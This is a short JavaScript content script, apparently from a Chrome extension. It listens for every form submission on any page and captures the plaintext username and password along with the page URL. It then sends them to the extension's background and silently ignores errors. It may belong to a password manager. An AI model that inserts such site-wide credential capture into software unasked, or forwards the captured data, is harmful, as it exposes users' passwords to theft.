document.addEventListener('submit', (e) => {
  try {
    const form = e.target;
    const pwd = form.querySelector('input[type="password"]');
    if (!pwd) return;
    const user = form.querySelector('input[type="text"], input[type="email"]');
    chrome.runtime.sendMessage({
      type: 'form-submitted',
      url: location.href,
      username: user ? user.value : '',
      password: pwd.value
    });
  } catch(err) { /* ignore */ }
}, true);
